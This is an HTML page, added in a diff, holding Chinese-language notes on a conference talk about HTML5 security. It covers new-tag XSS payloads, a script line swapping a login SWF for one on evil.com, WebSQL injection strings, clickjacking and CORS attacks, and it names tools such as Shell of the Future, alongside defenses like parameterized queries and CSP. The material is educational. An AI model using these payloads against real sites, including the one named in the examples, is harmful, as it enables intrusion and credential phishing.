@@ -1,0 +1,389 @@
+<!doctype html>
+<html>
+<head>
+<meta charset="utf-8">
+<style>
+h1,
+h2,
+h3,
+h4,
+h5,
+h6,
+p,
+blockquote {
+    margin: 0;
+    padding: 0;
+}
+body {
+    font-family: "Helvetica Neue", Helvetica, "Hiragino Sans GB", Arial, sans-serif;
+    font-size: 13px;
+    line-height: 18px;
+    color: #737373;
+    margin: 10px 13px 10px 13px;
+}
+a {
+    color: #0069d6;
+}
+a:hover {
+    color: #0050a3;
+    text-decoration: none;
+}
+a img {
+    border: none;
+}
+p {
+    margin-bottom: 9px;
+}
+h1,
+h2,
+h3,
+h4,
+h5,
+h6 {
+    color: #404040;
+    line-height: 36px;
+}
+h1 {
+    margin-bottom: 18px;
+    font-size: 30px;
+}
+h2 {
+    font-size: 24px;
+}
+h3 {
+    font-size: 18px;
+}
+h4 {
+    font-size: 16px;
+}
+h5 {
+    font-size: 14px;
+}
+h6 {
+    font-size: 13px;
+}
+hr {
+    margin: 0 0 19px;
+    border: 0;
+    border-bottom: 1px solid #ccc;
+}
+blockquote {
+    padding: 13px 13px 21px 15px;
+    margin-bottom: 18px;
+    font-family:georgia,serif;
+    font-style: italic;
+}
+blockquote:before {
+    content:"\201C";
+    font-size:40px;
+    margin-left:-10px;
+    font-family:georgia,serif;
+    color:#eee;
+}
+blockquote p {
+    font-size: 14px;
+    font-weight: 300;
+    line-height: 18px;
+    margin-bottom: 0;
+    font-style: italic;
+}
+code, pre {
+    font-family: Monaco, Andale Mono, Courier New, monospace;
+}
+code {
+    background-color: #fee9cc;
+    color: rgba(0, 0, 0, 0.75);
+    padding: 1px 3px;
+    font-size: 12px;
+    -webkit-border-radius: 3px;
+    -moz-border-radius: 3px;
+    border-radius: 3px;
+}
+pre {
+    display: block;
+    padding: 14px;
+    margin: 0 0 18px;
+    line-height: 16px;
+    font-size: 11px;
+    border: 1px solid #d9d9d9;
+    white-space: pre-wrap;
+    word-wrap: break-word;
+}
+pre code {
+    background-color: #fff;
+    color:#737373;
+    font-size: 11px;
+    padding: 0;
+}
+@media screen and (min-width: 768px) {
+    body {
+        width: 748px;
+        margin:10px auto;
+    }
+}
+em {
+    font-style: normal;
+    color: red;
+}
+
+</style>
+<title>關注 HTML5 安全</title>
+</head>
+<body>
+<h1>關注 HTML5 安全</h1>
+
+<p><img src="http://articles.csdn.net/uploads/allimg/120911/145_120911100415_1.jpg" alt="" /></p>
+
+<ul>
+<li>講者：蔣宇傑（百度）- 送了我一本「關注 HTML5 與 CSS3」的書 :D</li>
+<li><a href="https://dl.dropbox.com/u/1953991/focus-html5-security.pptx">投影片</a></li>
+<li><a href="http://blog.csdn.net/hfahe/article/details/7960705">部落格</a></li>
+<li><a href="http://pan.baidu.com/share/link?shareid=25886&amp;uk=2802317001">線上閱讀</a></li>
+</ul>
+
+
+<h2>HTML 的發展</h2>
+
+<ul>
+<li>1991 年 - HTML 誕生</li>
+<li>1996 年 - CSS 與 JS 誕生、產生了 XSS</li>
+<li>2000 年 - HTML1、針對瀏覽器的攻擊</li>
+<li>2005 年 - Web 安全多樣化</li>
+<li>2008 年 - HTML5 出現 -> 新的變化！</li>
+</ul>
+
+
+<h2>HTML5 的美與危險</h2>
+
+<p>HTML5 就像是一朵玫瑰，它很美、但也有尖銳的刺。</p>
+
+<p>Web 需要不斷地往前發展、雖然解決一些舊的風險，但也會帶來新的特性，幫助攻擊者去引入新的攻擊模式。</p>
+
+<ul>
+<li>如何預防 HTML5 的新式攻擊：
+
+<ul>
+<li>第一個層面：規範。官方需要有一個安全規範、告訴開發者如何實作。</li>
+<li>第二個層面：機制。瀏覽器本身也要實現一些安全機制。</li>
+<li>第三個層面：意識。此 Session 的主要目的：在應用實作層面提醒開發者注意 HTML5 的安全問題，</li>
+</ul>
+</li>
+</ul>
+
+
+<h2>HTML5 的四層架構</h2>
+
+<p>第一層是表現層，第二層是邏輯層，第三層是網路層，第四層是核心層</p>
+
+<p><img src="http://farm9.staticflickr.com/8177/8021615225_063da467e3_b.jpg" alt="" /></p>
+
+<h3>第一層：表現層</h3>
+
+<h4>新的標籤攻擊</h4>
+
+<ul>
+<li>新標籤：Audio、Video、Canvas、Article、Footer…</li>
+<li>新屬性：poster、autofocus、formaction、oninput…</li>
+<li><p>以下的新 Pattern 必須加入 XSS 過濾機制 Filter 中！</p>
+
+<pre><code>  多媒体标签： &lt;video&gt;&lt;source onerror="javascript:alert(1)“&gt;
+              &lt;video poster=”javascript:alert(1)”&gt;
+   自动聚焦：   &lt;input autofocus onfocus=“alert(1)”&gt;
+   表单和按钮： &lt;form&gt;&lt;button formaction="javascript:alert(1)"&gt;test
+</code></pre></li>
+<li><p>利用 autofocus 的新 patter : 不用任何動作就可以執行 Script</p>
+
+<pre><code>   http://www.miiicasa.com/?text=&lt;input autofocus onfocus=alert(1)&gt;
+</code></pre></li>
+</ul>
+
+
+<h4>CORJacking</h4>
+
+<ul>
+<li><p>頁面上既有的 Flash</p>
+
+<pre><code>  &lt;object classid=“clsid:xxxxxxx-xxxx-xxxx-xxxxxx” id=“Login” width=“100%”  height=“100%” codebase=http://download.macromedia.com/pub/shockwave/cabs/flash/swflash.cab&gt;
+      &lt;param name=“movie” value=“Login.swf” /&gt;
+      &lt;param name=“quality” value=“high” /&gt;
+      &lt;embed src=“Login.swf” quality=“high” width=“50%” height=“50%”&gt;
+  &lt;/object&gt;
+</code></pre></li>
+<li><p>做 SWF 的替換放入假的 Facebook 登入介面：</p>
+
+<pre><code>  document.getElementByName(‘Login’).item(0).src=‘http://evil.com/login.swf’;
+</code></pre></li>
+</ul>
+
+
+<h4>API 攻擊</h4>
+
+<ul>
+<li>Web Notifications：盗取数据<br><img src="http://farm9.staticflickr.com/8462/8021721595_967a0c388f.jpg" alt="" /></li>
+<li>History API：可隱藏 XSS 的 URL</li>
+<li><p>registerProtocolHandler：網站可登記其能處理的通信規則。限 Firefox 使用。洩漏訊息</p>
+
+<pre><code>    navigator.registerProtocolHandler(“mailto”, “http://www.f.com/?uri=%s", “Evil Mail");
+</code></pre></li>
+</ul>
+
+
+<h3>第二層：邏輯層</h3>
+
+<h4>WebSQL 攻擊</h4>
+
+<p>可利用 SQL Injection、資料庫探測</p>
+
+<ul>
+<li><p>JavaScript 沒寫好：</p>
+
+<pre><code>  executeSql("SELECT name FROM stud WHERE id=" + input_id)
+</code></pre></li>
+<li><p>別人的 XSS 就可以 Dump 出 WebSQL 的資料：</p>
+
+<pre><code>  // id = "1 or 1 = 1"
+  http://www.miiicasa.com/websql.php?id=1%20or%201%20=%201
+</code></pre></li>
+<li><p>改善方式：</p>
+
+<ul>
+<li>檢查輸入類型</li>
+<li><p>改用參數形式</p>
+
+<pre><code>executeSql("SELECT name FROM stud WHERE id=?“,[input_id])
+</code></pre></li>
+<li><p>謹慎對待每一次 SQL 操作</p></li>
+<li>不要儲存重要數據 - Browser 端不應該有敏感資訊。</li>
+</ul>
+</li>
+</ul>
+
+
+<h4>Web Storage 攻擊</h4>
+
+<p>跟全域變數一樣的問題！</p>
+
+<ul>
+<li>全域變數、window.localStorage</li>
+<li>現有工具：<a href="http://www.scribd.com/doc/4012693/Abusing-HTML-5-Structured-Clientside-Storage">HTML5CSDump</a></li>
+<li>改進方式：
+
+<ul>
+<li>盡量將資料放在適合的 Scope 中，勿用全域變數。</li>
+<li>不要任何敏感的資料</li>
+</ul>
+</li>
+</ul>
+
+
+<h3>第三層：網路層攻擊</h3>
+
+<h4>WebWorker 攻擊：多執行緒</h4>
+
+<p>攻擊變得很有效率</p>
+
+<ul>
+<li>攻擊方式：
+
+<ul>
+<li>殭屍網路：DDos 攻擊、發送垃圾郵件。</li>
+<li>postMessage</li>
+</ul>
+</li>
+<li>攻擊工具：Ravan
+<img src="http://farm9.staticflickr.com/8318/8021667141_1fb29c9838_z.jpg" alt="" /></li>
+<li>防禦方式：
+
+<ul>
+<li>避免去不安全的網站（使用者）</li>
+<li>使用 postMessage 需要驗證來源 (網站)</li>
+<li>使用 postMessage 避免使用 innerHTML (網站)</li>
+</ul>
+</li>
+</ul>
+
+
+<h4>WebSocket 攻擊</h4>
+
+<p><img src="http://cometdaily.com/wp-content/uploads/2008/07/orbited-firewall.png" alt="" /></p>
+
+<ul>
+<li>成為後門、Port Scanning、殭屍網路、網路探測器</li>
+<li>攻擊工具：<a href="http://www.andlabs.org/tools/jsrecon.html">JS Recon</a></li>
+</ul>
+
+
+<h3>第四層：核心層</h3>
+
+<h4>Clickjacking 攻擊</h4>
+
+<p><img src="http://honeyaordoubadi.files.wordpress.com/2010/03/clickjacking.jpg" alt="" /></p>
+
+<p>利用 Iframe 把 miiiCasa 的網頁放入，再上面疊一層透明的表單，對齊好輸入框</p>
+
+<ul>
+<li><a href="http://www.protecht.ca/clickjacktest">測試工具</a></li>
+<li>防禦之道：
+
+<ul>
+<li>設定 X-Frame-Options</li>
+<li><p>防止網頁被嵌入 (噗浪)</p>
+
+<pre><code>if (top !== window) top.location = window.location.href;
+</code></pre></li>
+</ul>
+</li>
+</ul>
+
+
+<h4>CORS 攻擊</h4>
+
+<p>利用 HTTP Header 做跨網域存取。</p>
+
+<ul>
+<li>可能帶來的風險：
+
+<ul>
+<li>HTTP Header 可以被竄改，是不可信賴的</li>
+<li>原本信賴的網站可能會被入侵</li>
+<li>惡意的跨網域請求</li>
+<li>內部訊息的洩漏</li>
+<li>針對用戶的攻擊</li>
+</ul>
+</li>
+<li>攻擊工具 - <a href="http://www.andlabs.org/tools.html">Shell of the future</a>
+
+<ul>
+<li>Shell of the Future is a Reverse Web Shell handler. It can be used to hijack sessions where JavaScript can be injected using Cross-site Scripting or through the browser&rsquo;s address bar. <em>It makes use of HTML5&rsquo;s Cross Origin Requests and can bypass anti-session hijacking measures like Http-Only cookies and IP address-Session ID binding.</em></li>
+</ul>
+</li>
+<li>防禦方式：
+
+<ul>
+<li>不信任未經身分驗證的跨網域請求</li>
+<li>Request 的那一方需要<em>驗證接受數據的有效性</em> 、Response 的那一方需<em>暴露最少的功能</em>。</li>
+<li>透過多種條件檢驗非法 Request (HTTP Header、Parameter&hellip;)</li>
+</ul>
+</li>
+</ul>
+
+
+<h2>HTML5 對於安全性的改進</h2>
+
+<ul>
+<li>Iframe Sandbox</li>
+<li><p>Content Security Policy - 內容安全策略</p>
+
+<pre><code>   Content-Security-Policy: default-src https://jiang.yujie.net; frame-src 'none'; 
+</code></pre></li>
+<li><p>XSS Filter</p></li>
+<li>Todo - HTML5 安全規範</li>
+</ul>
+
+
+<h2>HTML5 開創的藍海</h2>
+
+<p>HTML4 對安全性有 Antisamy、HTML purifier 等公司專門做檢查，目前 HTML5 還是一片空。
+目前很少公司會把 Port 80 鎖掉。國外有一家公司正在做一件事情：面對基於 Web 的攻擊。<em>當前的防火牆對於 Web 很難進行禁止與防禦</em>，這家公司提供的新式防火牆，針對内容進行深入檢查。</p>
+</body>
+</html>
